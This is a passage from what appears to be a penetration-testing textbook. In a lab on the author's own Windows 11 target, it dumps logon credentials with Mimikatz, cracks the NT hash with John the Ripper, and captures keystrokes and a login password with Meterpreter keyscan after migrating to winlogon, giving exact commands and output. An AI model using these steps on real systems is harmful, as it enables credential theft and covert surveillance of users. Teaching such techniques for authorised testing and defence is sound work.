
4. Typing “whoami” with verify that we are at system level authority:

```
C:\Windows\System32>  
C:\Windows\System32>whoami  
nt authority\system
```

5. Navigate to your USB drive, which is drive E: on my system.

6. Change into your Mimikatz directory and then the ‘Win32’ or ‘x64’ directory, depending on your target Operating System.

7. Run the Mimikatz tool.

8. Enter, “privilege::debug”

9. And then, “sekurlsa::LogonPasswords”:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::LogonPasswords

Authentication Id : 0 ; 61167 (00000000:0009535f)
Session : Interactive from 1
User Name : Dan
Domain : WINDOWS-11
Logon Server : WINDOWS-11
Logon Time : 3/9/2023 3:42:36 PM
SID : S-1-5-21-2082602673-1779826494-1491094936-1001
    msv :
        [00000003] Primary
        * Username : Dan
        * Domain : WINDOWS-11
        * NTLM : 03d0737a1820d94781efd6d1ff7b5726e
        * SHA1 : e8176b7fb62a9431833aac90de80ffd94dc14eee
```

**Note:**

If the data scrolls off the page and you can't see it, you may need to go to the Properties menu for the command prompt window and increase the window size. In this example I had to set the window height to 200.

![](img/4a03f08556c51a14a3b88fe549a54ca8_166_0.png)

Some older systems will give you plain text passwords. Newer ones will give you the password hash. You would then need to crack the hash. You can do this using either John the Ripper or Hashcat. Here is the hash from a Server 2016 system that I cracked using John:

```
root@kali:~/Desktop# john --format=NT --wordlist=geekphrases.txt Server2016hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x1])
Press 'q' or Ctrl-C to abort, almost any other key for status
SayFriendAndEnter  (?
```

John is called using the NT Hash format, a wordlist and the password hash (stored in a text file). In this instance, the user Dan used the password, “SayFriendAndEnter” - Obviously a Lord of the Rings fan.

As I mentioned earlier, you would need to have physical access to the machine to set up the initial Ustilman Login Bypass beforehand. You then need to run Mimikatz, which I just downloaded and put on a USB drive for convenience. Lastly, someone had to have logged onto the system since it booted, or it will not return any creds. If no-one has logged onto the system yet, there are no passwords in memory for Mimikatz to pull. It worked great using the Ustilman Bypass and Mimikatz together in our exercise, but either technique on its own is still very effective.

## KEYSCAN, LOCKOUT KEYLOGGER, AND STEP RECORDER

When a penetration tester has remote access to a user's machine, sometimes they find that it is beneficial to run a remote keyboard scanner. This tool is a program that runs silently in the background recording all the keys that a user presses. It is a way that you could possibly gain additional passwords. In this section we will look at two different ways to do this in Metasploit. Then we will look at turning Microsoft's Problem Step Recorder into a remote recording "spy" tool.

## KEYLOGGING WITH METASPLOIT

We will start this chapter by exploring Metasploit’s built in key scanner. Metasploit has a helpful set of Meterpreter commands for capturing keys pressed on a target machine.

- **keyscan_dump**
- **keyscan_start**
- **keyscan_stop**

These commands are available through Meterpreter, so we will start with a system that we have already run an exploit on and were successful in creating a remote session. We will use our Windows 11 system as a target. We will need System level access, so after we get the remote session, we will have to run the “**getsystem**” command.

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

If we type “**help**” at the Meterpreter prompt we will be given a list of commands that we can run. For this section we are concerned with just the “**keyscan**” commands:

```
keyscan_dump    Dump the keystroke buffer
keyscan_start   Start capturing keystrokes
keyscan_stop    Stop capturing keystrokes
```

So, let’s go ahead and see what it looks like when we start a remote keylogger. Then we will view the captured key strokes.

1. Simply type “**keyscan_start**” to start the remote logging.

```
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter >
```

In a real test we would then just need to wait until the target typed some things on the keyboard. For our example, go ahead and open your Windows 11 browser and perform a search in Google.

2. Now back on the Kali system, to see what was typed simply enter "keyscan_dump":

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
google.com<CR>
will dallas go to the super bowl next year<Right Shift><CR>
```

Here you can see from this demo that our target user went to google.com and searched for "will dallas go to the super bowl next year?" Well, obviously our user is a sadly disappointed, but ever hopeful Dallas football fan. Let’s try one more thing. Notice it picked up the <Right Shift> and <CR> presses. What happens if the user uses other special keys like the Windows key? Also, what would happen if the user used the "Windows" + "L" key to lock his keyboard, and then used their password to get back in? Could we capture their password?

3. Lock your Windows system with the "Windows" and "L" key.
4. Log back in with the password.
5. On the Kali system type "keyscan_dump" again:

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
<LWin> l
meterpreter >
```

It correctly recorded that I pressed the "<LWin>" or the left Windows key and the 'l' key. But I logged back in with a password, so where is the password?

It wasn’t recorded!

The problem is in the way Windows security works. Simply put, the active session (desktop) and winlogon (Login process) use different keyboard buffers. If you are sniffing the active session, you cannot capture keys entered for a login, or vice versa. You need to move your key logger to the session that you want to monitor. So, in this case, simply migrating our Meterpreter shell to the winlogon process puts us in the correct mode to look for passwords. We then need to start keyscan again.

Let's step through this process:

6. Type “ps” in Meterpreter to get a process list. Look for the PID of the process “winlogon”.

![](img/4a03f08556c51a14a3b88fe549a54ca8_171_0.png)

As you can see in the image above winlogon.exe has the Process ID number 472 (yours will be different). We simply need to migrate our Meterpreter session to that ID.

7. Type “migrate <winlogon PID#>” or in my case here “migrate 472”.

![](img/4a03f08556c51a14a3b88fe549a54ca8_171_1.png)

8. Now go ahead and start keyscan again, “keyscan_start”.
9. Then Lock the Windows 11 workstation and log back in.
10. And finally, dump the keylog to view the user password using, “keyscan_dump”:

![](img/4a03f08556c51a14a3b88fe549a54ca8_171_2.png)

And we have the password, of `"password"`! I know, I know, yet another super security conscious user. Don't laugh, it still happens in real life. I saw one major corporation that disabled password complexity on their domain so they could keep the simple password that they used for like 10 years. Pro tip, change your domain password on a schedule and definitely change it if you fire Domain Admins. Many will come back and try their old creds remotely; I have seen that occur numerous times...

In the previous picture, notice the `"Windows" + "L"` keystroke to lock the desktop does not show up. This is because we are now monitoring the winlogon session key buffer, so it is not displayed. So, in essence, because our target needed another cup of coffee to get through their busy day of web surfing, they locked their desktop and then logged in again. When they did, we were able to grab their full password.

Go ahead and stop the keyscan with `keyscan_stop`.

There is an automated Post module that performs this attack, and automatically handles all the switching - **post/windows/capture/lockout_keylogger**. At the time of this writing, it does not seem functional, but worth checking out! Next, I want to look at using a built in Microsoft tool that is in every version of Windows since 7 as a remote screengrab and user activity logging tool. Though it is not a key scanner, it could be used during a pentest to obtain some interesting information that could also be very convincing in an after-action report.

As I said in the beginning of this chapter, these are more, "exotic" ways to obtain passwords and not necessary in actually cracking passwords. I just thought you might find them interesting. Next up, let's look at some ways to defend against password attacks!
